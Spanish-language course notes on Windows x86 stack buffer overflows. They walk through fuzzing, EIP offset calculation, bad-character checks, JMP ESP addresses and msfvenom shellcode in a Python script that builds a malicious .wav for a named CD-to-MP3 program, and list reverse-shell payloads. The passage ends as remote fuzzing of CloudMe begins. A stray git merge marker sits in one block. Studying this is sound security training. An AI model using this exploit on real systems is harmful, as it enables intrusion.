# Debugging Windows Programs

Para identificar y explotar con éxito los desbordamientos de búfer en los programas de Windows, necesitamos depurar el programa para seguir su flujo de ejecución y sus datos en la memoria. Hay muchas herramientas que podemos usar para la depuración, como [Immunity Debugger](https://www.immunityinc.com/products/debugger/index.html) , [OllyDBG](http://www.ollydbg.de/) , [WinGDB](http://wingdb.com/) o [IDA Pro](https://www.hex-rays.com/products/ida/) . Sin embargo, estos depuradores están desactualizados (Immunity/OllyDBG) o necesitan una licencia pro para su uso (WinGDB/IDA).

En este módulo, utilizaremos [x64dbg](https://github.com/x64dbg/x64dbg) , que es un excelente depurador de Windows orientado específicamente a la explotación binaria y la ingeniería inversa. `x64dbg`es una herramienta de código abierto desarrollada y mantenida por la comunidad y también admite la depuración x64 (a diferencia de Immunity), por lo que podemos seguir usándola cuando queramos pasar a desbordamientos de búfer x64 de Windows.

Además del depurador en sí, utilizaremos un complemento de explotación binaria para llevar a cabo de manera eficiente muchas tareas necesarias para identificar y explotar desbordamientos de búfer. Un complemento popular es [mona.py](https://github.com/x64dbg/mona) , que es un excelente complemento de explotación binaria, aunque ya no se mantiene, no es compatible con x64 y se ejecuta en Python2 en lugar de Python3. Por lo tanto, en su lugar, utilizaremos [ERC.Xdbg](https://github.com/Andy53/ERC.Xdbg) , que es un complemento de explotación binaria de código abierto para x64dbg.

## Instalación

### x64dbg

Para instalarlo `x64dbg`, podemos seguir las instrucciones que se muestran en su [página de GitHub](https://github.com/x64dbg/x64dbg) , ir a la página [de la última versión](https://github.com/x64dbg/x64dbg/releases/tag/snapshot) y descargar el `snapshot_<SNIP>.zip`archivo. Una vez que lo descarguemos en nuestra máquina virtual Windows, podemos extraer el `zip`contenido del archivo, cambiar el nombre de la `release`carpeta a algo como `x64dbg`y moverla a nuestra `C:\Program Files`carpeta o guardarla en cualquier carpeta que queramos.

Finalmente, podemos hacer doble clic `C:\Program Files\x64dbg\x96dbg.exe`para registrar la extensión de shell y agregar un acceso directo a nuestro Escritorio.

### ERC

Para instalar el `ERC` plugin, podemos ir a la [página de lanzamiento](https://github.com/Andy53/ERC.Xdbg/releases) y descargar el `zip`archivo que coincida con nuestra VM (`x64`o `x32`), que en nuestro caso es `ERC.Xdbg_32-<SNIP>.zip`. Una vez que lo descarguemos en nuestra VM de Windows, podemos extraer su contenido en `x32dbg`la carpeta plugins ubicada en `C:\Program Files\x64dbg\x32\plugins`.

Cuando se complete el proceso, el complemento debería estar listo para usarse. Por lo tanto, una vez que ejecutemos `x32dbg`, podemos escribir `ERC --help` en la barra de comandos en la parte inferior para ver `ERC`el menú de ayuda de .

Para visualizar la `ERC`salida del , debemos pasar a la `Log` pestaña haciendo clic sobre ella o haciendo clic en `Alt+L`, como podemos ver a continuación:

![](../../Images/Pasted%20image%2020240924085743.png)

# Local Buffer Overflow

## Fuzzing Paramenter

El primer paso en cualquier ejercicio de vulnerabilidad binaria es realizar pruebas de fuzzing en varios parámetros y cualquier otra entrada que acepte el programa para ver si nuestra entrada puede hacer que la aplicación se bloquee. Si alguna de nuestras entradas logra que el programa se bloquee, revisamos qué causó el bloqueo del programa. Si vemos que el programa se bloqueó porque nuestra entrada sobrescribió el `EIP` registro, es probable que tengamos una vulnerabilidad de desbordamiento de búfer basada en pila. Todo lo que queda es explotar esta vulnerabilidad con éxito, lo que puede variar en dificultad según el sistema operativo, la arquitectura del programa y las protecciones.
### Fuzzing en campos de texto

```
```powershell-session
python -c "print('A'*10000)"
```
### Fuzzing de archivo abierto

```powershell-session
python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
```
## Controlling EIP

Nuestro próximo paso sería controlar con precisión qué dirección se coloca en `EIP` , de modo que se ejecute cuando el programa regrese de la función con la `ret` instrucción. Para ello, primero debemos calcular nuestro desplazamiento exacto de `EIP` , lo que significa qué tan lejos `EIP` está del comienzo de la entrada. Una vez que conocemos el desplazamiento, podemos llenar el búfer que conduce a `EIP` con cualquier dato basura y luego colocar la dirección de instrucción que queremos que se ejecute en la ubicación de `EIP`.

La mejor manera de calcular el desplazamiento exacto de `EIP` es mediante el envío de un patrón único y no repetitivo de caracteres, de modo que podamos ver los caracteres que lo completan `EIP` y buscarlos en nuestro patrón único. Como es un patrón único y no repetitivo, solo encontraremos una coincidencia, que nos daría el desplazamiento exacto de `EIP`.

### Creando un patrón único

Podemos generar un patrón único `pattern_create` en nuestra máquina atacante o directamente en nuestro depurador `x32dbg` con el `ERC` complemento. 

Para hacerlo en nuestra máquina, podemos usar el siguiente comando:

```shell-session
/usr/bin/msf-pattern_create -l 5000

Aa0Aa1Aa2...SNIP...3Gk4Gk5Gk
```

Siempre es más fácil hacer todo en Windows para evitar saltar entre dos máquinas virtuales. Veamos cómo podemos obtener el mismo patrón con `ERC`.

Si usamos el `ERC --help` comando, veremos la siguiente guía:

```cmd-session
--Pattern
Generates a non repeating pattern. A pattern of pure ASCII characters can be generated up to 20277 and up to  
66923 if special characters are used. The offset of a particular string can be found inside the pattern by 
providing a search string (must be at least 3 chars long).
    Pattern create: ERC --pattern <create | c> <length>
    Pattern offset: ERC --pattern <offset | o> <search string>
```

Como podemos ver, podemos usar `ERC --pattern c 5000` para obtener nuestro patrón. Entonces, usemos este comando y veamos qué obtenemos:

![](../../Images/Pasted%20image%2020240925172337.png)

Este patrón es el mismo que obtuvimos con la `msf-pattern_create` herramienta, por lo que podemos usar cualquiera de los dos. Ahora podemos ir a nuestro escritorio para buscar la salida guardada en un archivo llamado `Pattern_Create_1.txt`.

### Escribiendo nuestro exploit

Escribiremos nuestro exploit en Python3, ya que contiene bibliotecas integradas que nos ayudan en este proceso, como `struct` y `requests`.

Podemos empezar creando una nueva función con `def eip_offset():`, y luego crear nuestra `payload`variable como un `bytes`objeto y pegar entre paréntesis la `Ascii:` salida de `Pattern_Create_1.txt`. Así, podemos hacer clic en la barra de búsqueda de Windows en la parte inferior y escribir `IDLE`, lo que abriría el editor de Python3, y luego hacer clic `ctrl+N` para comenzar a escribir un nuevo script de Python donde podemos comenzar a escribir nuestro código. Nuestro código inicial debería verse así:

```python
def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk",
					"utf-8")
```

A continuación, bajo la misma `eip_offset()` función, escribiremos `payload` en un archivo llamado `pattern.wav`, agregando las siguientes líneas:

```python
with open('pattern.wav', 'wb') as f:
    f.write(payload)
```

Por último, debemos llamar a nuestra `eip_offset()` función agregando la siguiente línea al final. De lo contrario, la función no se ejecutará:

```python3
eip_offset()
```

Ahora, podemos guardar este exploit en nuestro escritorio como `win32bof_exploit.py` y ejecutarlo. Para ejecutarlo mientras aún estamos en nuestro escritorio `IDLE`, podemos hacer clic en `Run > Run Module` o hacer clic en `F5`:

![](../../Images/Pasted%20image%2020240925172323.png)

### Cálculo de la compensación del EIP

Ahora podemos usar el valor de `EIP`para calcular el desplazamiento. Podemos hacerlo nuevamente en nuestra máquina con `msf-pattern_offset`(la contraparte de `msf-pattern_create`), usando el valor hexadecimal en `EIP`, de la siguiente manera:

```shell-session
0xRh4ps00dy@htb[/htb]$ /usr/bin/msf-pattern_offset -q 31684630
>>>>>>> origin/main:Stack-Based Buffer Overflow/Windows/Stack-Based Buffer Overflows en Windows x86 (HackTheBox).md

[*] Exact match at offset 4112
```

Usando ERC en x32dbg o x64dbg debemos obtener el valor ASCII de los bytes hexadecimales que se encuentran en `EIP`, haciendo clic derecho en `EIP`y seleccionando `Modify Value`, o haciendo clic en `EIP`y luego presionando Enter. Una vez que lo hagamos, veremos varias representaciones del `EIP`valor, siendo ASCII la última:

![](../../Images/Pasted%20image%2020240924205944.png)

El valor hexadecimal encontrado en `EIP`representa la cadena `1hF0`. Ahora, podemos usar `ERC --pattern o 1hF0`para obtener el desplazamiento del patrón:

![](../../Images/Pasted%20image%2020240924210004.png)

### Control del EIP

Nuestro paso final es asegurarnos de que podemos controlar qué valor va en `EIP`. Conociendo el desplazamiento, sabemos exactamente a qué distancia `EIP` está nuestro del inicio del búfer. Por lo tanto, si enviamos `4112` bytes, los siguientes 4 bytes serían los que llenarían `EIP`.

Agreguemos otra función, `eip_control()`, a nuestra `win32bof_exploit.py` y creemos una `offset` variable con el desplazamiento que encontramos. Luego, crearemos una `buffer` variable con una cadena de `A`bytes tan larga como nuestro desplazamiento para llenar el espacio del búfer y una `eip`variable con el valor que queremos `EIP` que sea, que usaremos como `4`bytes de `B`. Finalmente, agregaremos ambas a una `payload`variable y las escribiremos en `control.wav`, de la siguiente manera:

```python
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

eip_control()
```

## Indificando personajes malos

Antes de comenzar a utilizar el hecho de que podemos controlar `EIP` y subvertir el flujo de ejecución del programa, necesitamos determinar los caracteres que debemos evitar usar en nuestra carga útil.

Como estamos atacando un parámetro de entrada (un archivo abierto en este caso), se espera que el programa procese nuestra entrada. Por lo tanto, dependiendo del procesamiento que cada programa ejecute sobre nuestra entrada, ciertos caracteres pueden indicarle al programa que ha llegado al final de la entrada. Esto puede suceder incluso aunque todavía no haya llegado al final de la entrada.

Por ejemplo, un carácter incorrecto muy común es un byte nulo `0x00`, utilizado en Assembly como un terminador de cadena, que le dice al procesador que la cadena ha terminado. Entonces, si nuestra carga útil incluye un byte nulo, el programa puede dejar de procesar nuestro shellcode, pensando que ha llegado al final de la misma. Esto hará que nuestra carga útil no se ejecute correctamente y nuestro ataque fallará. Más ejemplos son `0x0a`y `0x0d`, que son la nueva línea `\n` y el retorno de carro `\r`, respectivamente. Si estuviéramos explotando un desbordamiento de búfer en una entrada de cadena que se espera que sea una sola línea (como una clave de licencia), estos caracteres probablemente terminarían nuestra entrada prematuramente, lo que también haría que nuestra carga útil falle.

Para identificar caracteres incorrectos, tenemos que enviar todos los caracteres después de completar la `EIP` dirección, que se encuentra después de `4112`+ `4` bytes. Luego, verificamos si el programa eliminó alguno de los caracteres o si nuestra entrada se truncó prematuramente después de un carácter específico.

Para ello necesitaríamos dos archivos:

1. Un `.wav` archivo con todos los caracteres para cargar en el programa.
2. Un `.bin` archivo para comparar con nuestra entrada en memoria

Podemos utilizar `ERC` para generar el `.bin` archivo y generar una lista de todos los caracteres para crear nuestro `.wav` archivo. Para ello, podemos utilizar el `ERC --bytearray` comando:

![](../../Images/Pasted%20image%2020240925071440.png)

Esto también crea dos archivos en nuestro escritorio:

- `ByteArray_1.txt`: Que contiene la cadena de todos los caracteres que podemos usar en nuestro exploit de Python
- `ByteArray_1.bin`: Que podemos usar `ERC` más adelante para comparar con nuestra entrada en la memoria.
### Actualizando nuestro exploit

El siguiente paso sería generar un `.wav` archivo con la cadena de caracteres generada por `ERC`. Nuevamente escribiremos una nueva función `bad_chars()`, y usaremos un código similar a la `eip_control()` función, pero usaremos los caracteres bajo `C#`in `ByteArray_1.txt`. Crearemos una nueva lista de bytes `all_chars = bytes([])`, y pegaremos los caracteres entre los corchetes. Luego escribiremos en `chars.wav` el mismo `payload`from `eip_control()`, y agregaremos después `all_chars`. La función final se vería así:

```python
def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
        ...SNIP...
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()
```
### Comparando nuestra entrada

Copiar la dirección de `ESP` ya que es donde se encuentra nuestra entrada. Esto lo podemos hacer haciendo clic derecho sobre ella y seleccionando `Copy value`, o haciendo clic en `[Ctrl + C]`:

![](../../Images/Pasted%20image%2020240925162653.png)

Una vez que tenemos el valor de `ESP`, podemos usarlo `ERC --compare` y darle la `ESP` dirección y la ubicación del `.bin` archivo que contiene todos los caracteres, de la siguiente manera:

```cmd-session
ERC --compare 0014F974 C:\Users\htb-tudent\Desktop\ByteArray_1.bin
```

Lo que hará este comando es comparar byte por byte tanto nuestra entrada `ESP`como todos los caracteres que generamos anteriormente en `ByteArray_1.bin`:

![](../../Images/Pasted%20image%2020240925162721.png)

Como podemos ver, esto coloca cada byte de ambas ubicaciones uno al lado del otro para detectar rápidamente cualquier problema. El resultado que buscamos es que todos los bytes de ambas ubicaciones sean iguales, sin diferencias de ningún tipo. Sin embargo, vemos que después del primer carácter, `00`todos los bytes restantes son diferentes. `"Esto indica que 0x00 truncado la entrada restante y, por lo tanto, debe considerarse un carácter incorrecto"`.

### Eliminando Malos Personajes

Ahora que hemos identificado el primer carácter incorrecto, debemos utilizar `--bytearray`nuevamente para generar una lista de todos los caracteres sin caracteres incorrectos, que podemos especificar con `-bytes 0x00,0x0a,0x0d...etc.`. Por lo tanto, utilizaremos el siguiente comando:

```cmd-session
ERC --bytearray -bytes 0x00
```

Ahora, usemos este comando `ERC`nuevamente para generar el nuevo archivo y usarlo para actualizar nuestro exploit:

![](../../Images/Pasted%20image%2020240925162815.png)

Como podemos ver, esta vez, decía `excluding: 00`, y la tabla de matriz no incluye `00`al principio. Entonces, vayamos al archivo de salida generado `ByteArray_2.txt`, copiemos los nuevos bytes en `C#`, y colóquelos en nuestro exploit, que ahora debería verse así:

```python
def bad_chars():
    all_chars = bytes([
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
...SNIP...
```

Una vez que tengamos nuestro nuevo `chars.wav`archivo, lo cargaremos nuevamente en nuestro programa y lo usaremos `--compare`con el nuevo `ByteArray_2.bin`archivo para ver si ambas entradas coinciden:

![](../../Images/Pasted%20image%2020240925162840.png)

Como podemos ver, esta vez, ambas líneas coinciden perfectamente hasta `0xFF`, lo que significa que ya no hay caracteres incorrectos en nuestra entrada. Si hubiéramos identificado otro carácter incorrecto, repetiríamos el mismo proceso que acabamos de realizar para `Eliminating Bad Characters`hasta que ambas líneas coincidan perfectamente.

Entonces, ahora sabemos que debemos evitar usar `0x00`en la `EIP` dirección que queremos ejecutar o en nuestro shellcode.

## Encontrar una instrucción de devolución

### Subvirtiendo el flujo del programa

Para subvertir con éxito el flujo de ejecución del programa, debemos escribir una dirección de trabajo en `EIP` que conduzca a una instrucción que nos beneficie. Actualmente, solo hemos escrito 4 `B` en `EIP`, que (obviamente) no es una dirección de trabajo, y cuando el programa intente ir a esta dirección, fallará, lo que provocará que todo el programa se bloquee.

Para encontrar una dirección que podamos usar, debemos observar todas las instrucciones utilizadas o cargadas por nuestro programa, elegir una de ellas y escribir su dirección en `EIP`. En los sistemas modernos con Address Space Layout Randomization (ASLR), si elegimos una dirección, será inútil, ya que cambiaría la próxima vez que se ejecute nuestro programa, ya que se aleatoriza. En ese caso, tendríamos que seguir un método para filtrar el conjunto actual de direcciones en tiempo real y usarlo en nuestro exploit. Sin embargo, no estamos tratando con ninguno de estos tipos de protecciones en este módulo, por lo que podemos asumir que la dirección que elijamos no cambiará y podemos usarla de manera segura en nuestro programa.

Para saber qué instrucción utilizar, primero debemos saber qué queremos que haga esta dirección. Si bien los métodos de explotación binaria más avanzados `ROP` se basan en la utilización y el mapeo de varias instrucciones locales para realizar el ataque (como enviar un shell inverso), aún no tenemos que llegar a este nivel avanzado, ya que estamos tratando con un programa con la mayoría de las protecciones de memoria deshabilitadas.

Entonces, utilizaremos un método conocido como `Saltar a la pila`.

### Saltar a la pila

Como ya tenemos datos en la pila, que está repleta de información, podemos escribir instrucciones que nos envíen un shell inverso cuando se ejecuten (en forma de código de máquina/shellcode). Una vez que escribimos nuestros datos en la pila, podemos dirigir el flujo de ejecución del programa a la pila, de modo que comience a ejecutar nuestro shellcode, momento en el que recibiríamos un shell inverso y obtendríamos el control del servidor remoto.

Para dirigir el flujo de ejecución a la pila, debemos escribir una dirección para `EIP`ello. Esto se puede hacer de dos maneras:

1. Podemos utilizar la `ESP` dirección.
2. Podemos buscar `JMP ESP` instrucciones en módulos cargados con seguridad deshabilitada.

### Uso de la dirección ESP

Primero, probemos el método más básico para escribir la dirección de la parte superior de la pila `ESP`. Una vez que escribimos una dirección `EIP` y el programa falla en la instrucción de retorno `ret`, el depurador se detendría en ese punto y la `ESP` dirección en ese punto coincidiría con el comienzo de nuestro shellcode, de manera similar a cómo vimos nuestros caracteres en la pila cuando buscamos caracteres incorrectos. Podemos tomar nota de la `ESP`dirección en este punto, que en este caso es `0014F974`:

![](../../Images/Pasted%20image%2020240925164513.png)

Este método puede funcionar para este programa en particular, pero no es un método muy confiable en las máquinas Windows. En primer lugar, la entrada que estamos atacando aquí es un archivo de audio, por lo que vemos que se permiten todos los caracteres sin caracteres incorrectos. Sin embargo, en muchos casos, podemos estar atacando una entrada de cadena o un argumento de programa, en cuyo caso `0x00`sería un carácter incorrecto y no usaríamos la dirección de `ESP` ya que comienza con `00`.

Otra razón es que la dirección de `ESP` puede no ser la misma en todas las máquinas. Por lo tanto, puede funcionar durante todo el proceso de depuración y desarrollo del exploit, pero puede que no sea la misma dirección cuando lancemos el exploit a un objetivo real, ya que puede tener una `ESP`dirección diferente, en cuyo caso nuestro exploit fallaría.

### Uso de JMP ESP

La forma más confiable de ejecutar el shellcode cargado en la pila es encontrar una instrucción utilizada por el programa que dirija el flujo de ejecución del programa a la pila. Podemos usar varias instrucciones de este tipo, pero usaremos la más básica, , `JMP ESP` que salta a la parte superior de la pila y continúa la ejecución.

#### Localización de módulos

Para encontrar esta instrucción, debemos buscar en los ejecutables y bibliotecas cargados por nuestro programa. Esto incluye:

1. El archivo del programa `.exe`. 
2. Las bibliotecas propias del programa `.dll`. 
3. Cualquier biblioteca `.dll` de Windows utilizada por el programa.

Para encontrar una lista de todos los archivos cargados por el programa, podemos utilizar `ERC --ModuleInfo`, de la siguiente manera:

![](../../Images/Pasted%20image%2020240925164619.png)

Encontramos muchos módulos cargados por el programa, sin embargo podemos obviar algunos archivos con:

- `NXCompat`:Como estamos buscando una `JMP ESP` instrucción, el archivo no debería tener protección de ejecución de pila.
- `Rebase`o `ASLR`: Dado que estas protecciones provocarían que las direcciones cambiaran entre ejecuciones

En cuanto a `OS DLL`, si estamos ejecutando una versión más nueva de Windows como Windows 10, podemos esperar que todos los archivos DLL del sistema operativo tengan todas las protecciones de memoria presentes, por lo que no usaríamos ninguna de ellas. Si estuviéramos atacando una versión anterior de Windows como Windows XP, muchas de las DLL del sistema operativo cargadas probablemente no tengan protecciones para que podamos buscar `JMP ESP` instrucciones en ellas también.

Si solo consideramos los archivos con `False` todas las protecciones configuradas, obtendremos la siguiente lista:

```cmd-session
------------------------------------------------------------------------------------------------------------------------ 
 Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name, and Path 
------------------------------------------------------------------------------------------------------------------------ 
0x400000        0xd88fc         0x11c000    False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\cdextract.exe 
0x672c0000      0x1000          0x13000     False      False      False      False      False      1.0rc1;AKRip32;C:\Program Files\CD to MP3 Freeware\akrip32.dll 
0x10000000      0xa3e0          0xc000      False      False      False      False      False      C:\Program Files\CD to MP3 Freeware\ogg.dll
```

Como podemos ver, todos los archivos pertenecen al propio programa, lo que indica que el programa y todos sus archivos fueron compilados sin ninguna protección de memoria, lo que significa que podemos encontrar `JMP ESP`instrucciones en ellos `La mejor opción es utilizar una instrucción del propio programa, ya que nos aseguraremos de que esta dirección existirá independientemente de la versión de Windows en la que se ejecute el programa`.

#### Buscando JMP ESP

Ahora que tenemos una lista de archivos cargados que pueden incluir la instrucción que buscamos, podemos buscar en ellos instrucciones que podamos utilizar. Para acceder a cualquiera de estos archivos, podemos ir a la `Symbols` pestaña haciendo clic en ella o pulsando `alt+e`:

![](../../Images/Pasted%20image%2020240925164732.png)

Podemos empezar con `cdextract.exe` y hacer doble clic para abrir la vista y buscar sus instrucciones. Para buscar la `JMP ESP` instrucción dentro de las instrucciones de este archivo, podemos hacer clic en `ctrl+f`, lo que nos permite buscar cualquier instrucción dentro del archivo abierto `cdextract.exe`:

![](../../Images/Pasted%20image%2020240925164744.png)

Podemos ingresar `jmp esp`y debería mostrarnos si este archivo contiene alguna de las instrucciones que buscamos:

![](../../Images/Pasted%20image%2020240925164758.png)

Como podemos ver, encontramos las siguientes coincidencias:

```cmd-shell
Address  Disassembly
00419D0B jmp esp
00463B91 jmp esp
00477A8B jmp esp
0047E58B jmp esp
004979F4 jmp esp
```

Nota: También podemos buscar `CALL ESP`, que también saltará a la pila.

Al igual que ocurre con la dirección cuando se utiliza la `ESP`dirección . `Debemos asegurarnos de que la dirección de instrucción no contenga caracteres incorrectos`. De lo contrario, nuestra carga útil se truncaría y el ataque fallaría. Sin embargo, en nuestro caso, no tenemos ningún carácter incorrecto, por lo que podemos elegir cualquiera de las direcciones anteriores.
## Shellcode

### Generación de Shellcode

Para generar nuestro shellcode, usaremos `msfvenom`, que puede generar shellcodes para sistemas Windows, mientras que herramientas como `pwntools` actualmente solo admiten shellcodes de Linux.

Primero, podemos enumerar todas las cargas útiles disponibles para `Windows 32-bit`, de la siguiente manera:

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -l payloads | grep

...SNIP...
    windows/exec                                        Execute an arbitrary command
    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for
    windows/loadlibrary                                 Load an arbitrary library path
    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon
...SNIP...
```


Para realizar pruebas iniciales, intentemos `windows/exec` ejecutar la operación `calc.exe` para abrir la calculadora de Windows si nuestro exploit tiene éxito. Para ello, utilizaremos `CMD=calc.exe`, `-f 'python'` ya que estamos utilizando un exploit de Python, y `-b` para especificar los caracteres incorrectos:

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x31\x31\x50\x18\x03\x50\x18\x83\xc0\x39\x29"
buf += b"\x6b\xd4\xa9\x2f\x94\x25\x29\x50\x1c\xc0\x18\x50\x7a"
...SNIP...
```


Copiar la `buf` variable en nuestro exploit, donde ahora definiremos la función final `def exploit()`, que será nuestro código de exploit principal:

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf =  b""
    buf += b"\xd9\xec\xba\x3d\xcb\x9e\x28\xd9\x74\x24\xf4\x58\x29"
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"
```

### La carga útil final

Ahora que tenemos nuestro shellcode, podemos escribir la carga útil final que escribiremos en el `.wav` archivo que se abrirá en nuestro programa. Hasta ahora, sabemos lo siguiente:

1. `buffer`:Podemos llenar el buffer escribiendo`b"A"*offset`.
2. `EIP`:Los siguientes 4 bytes deberían ser nuestra dirección de retorno.
3. `buf`:Después de eso, podemos agregar nuestro shellcode.

En la sección anterior, encontramos múltiples direcciones de retorno que pueden funcionar al ejecutar cualquier código shell que escribamos en la pila:

|`ESP`|`JMP ESP`|`PUSH ESP; RET`|
|---|---|---|
|`0014F974`|`00419D0B`|`0047D4F5`|
|-|`00463B91`|`00483D0E`|
|-|`00477A8B`|-|
|-|`0047E58B`|-|
|-|`004979F4`|-|

Cualquiera de estos debería funcionar para ejecutar el código shell que escribimos en la pila (siéntete libre de probar algunos de ellos). Comenzaremos con el más confiable, `JMP ESP`, y elegiremos la primera dirección `00419D0B` y la escribiremos como nuestra dirección de retorno.

Para convertirlo `hex`en una dirección en Little Endian, utilizaremos una función de Python llamada que `pack`se encuentra en la `struct`biblioteca. Podemos importar esta función agregando la siguiente línea al comienzo de nuestro código:

```python
from struct import pack
```

Ahora podemos usar `pack` para convertir nuestra dirección a su formato adecuado y usar ' `<L`' para especificar que la queremos en formato Little Endian:

```python
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
```

### Relleno de código Shell

Ahora que tenemos `buffer`y `eip`, podemos agregar nuestro shellcode `buf`después de ellos y generar nuestro `.wav` archivo. Sin embargo, dependiendo del marco de pila actual del programa y de la alineación de pila, para cuando `JMP ESP` se ejecute nuestra instrucción, la parte superior de la dirección de la pila `ESP` puede haberse movido ligeramente. Los primeros bytes de nuestro shellcode pueden omitirse, lo que hará que el shellcode falle.

```python
    nop = b"\x90"*32
```

### Escritura de la carga útil en un archivo

Con esto nuestra carga útil final debería verse así:

```python
    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf
```

Luego podemos escribir `payload` en un `exploit.wav` archivo, como lo hicimos en funciones anteriores:

```python
    with open('exploit.wav', 'wb') as f:
        f.write(payload)
```

Una vez que ensamblamos todas estas partes, nuestra `exploit()` función final debería verse así:

```python
def exploit():
    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00'
    buf = b""
    ...SNIP...
    buf += b"\xfd\x2c\x39\x51\x60\xbf\xa1\xb8\x07\x47\x43\xc5"

    offset = 4112
    buffer = b"A"*offset
    eip = pack('<L', 0x00419D0B)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    with open('exploit.wav', 'wb') as f:
        f.write(payload)

exploit()
```

### Obtener ejecución de código

Lo que tenemos que hacer es cambiar nuestro shellcode para hacer otra cosa. Para la escalada de privilegios locales, podemos usar el mismo comando que usamos para `calc.exe`, pero `CMD=cmd.exe` en su lugar, use lo siguiente:

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/exec' CMD='cmd.exe' -f 'python' -b '\x00'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x31\x83\xed\xfc\x31\x45\x13\x03\x39\x8c\x6e"
...SNIP...
```

Si quisiéramos obtener un shell inverso, hay muchas `msfvenom` cargas útiles que podemos usar, de las cuales podemos obtener una lista de la siguiente manera:

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -l payloads | grep windows | grep reverse

...SNIP...
    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
...SNIP...
```

Podemos utilizar la `windows/shell_reverse_tcp` carga útil de la siguiente manera:

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'

...SNIP...
buf =  b""
buf += b"\xd9\xc8\xb8\x7c\x9f\x8c\x72\xd9\x74\x24\xf4\x5d\x33"
...SNIP...
```
# Remote Buffer Overflow

## Fuzzing remoto

### Depuración de un programa remoto

Depuraremos un programa llamado `CloudMe`, una herramienta de usuario final para un servicio de uso compartido de archivos, que se encuentra en el escritorio de la máquina virtual Windows que se muestra a continuación. Como servicio de uso compartido de archivos, esta herramienta escucha en un puerto las actualizaciones del servidor de archivos. Podemos ver esto si la herramienta se está ejecutando y enumeramos los puertos de escucha en `Powershell`:

```powershell-session
PS C:\htb> netstat -a

...SNIP...
TCP    0.0.0.0:8888           0.0.0.0:0              LISTENING
[CloudMe.exe]
```

Como podemos ver, el servicio está escuchando en el puerto `8888`y también ha establecido una conexión con un servidor remoto. Podemos usar el `netcat`programa en el Escritorio para interactuar con este puerto y ver si acepta algún parámetro:

```powershell-session
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
?
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 8888
help
```

Una vez que nuestro programa se está ejecutando y estamos conectados a él a través de `x32dbg`, podemos comenzar a fuzzearlo e intentar bloquearlo. A diferencia del fuzzing local, donde escribimos nuestras cargas útiles en un archivo y luego abrimos el archivo en nuestra aplicación o copiamos manualmente nuestra carga útil en un campo de texto en el programa, con el fuzzing remoto, podemos automatizar este proceso a través de nuestro exploit de Python.

Crearemos un nuevo script llamado `win32bof_exploit_remote.py` y comenzaremos agregando un par de variables para `IP`y `port`, de modo que podamos cambiarlas fácilmente si queremos usar el script en otro servidor. Luego, escribiremos nuestra función de fuzzing `def fuzz():`. Queremos enviar incrementos de cadenas grandes, comenzando con `500`bytes de longitud e incrementando en `500` en cada iteración, hasta que enviemos una cadena lo suficientemente larga como para hacer que el programa se bloquee. Para lograr esto, haremos un bucle en un rango de `0` a `10,000` con incrementos de `500`, de la siguiente manera:

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

def fuzz():
    for i in range(0,10000,500):
        buffer = b"A"*i
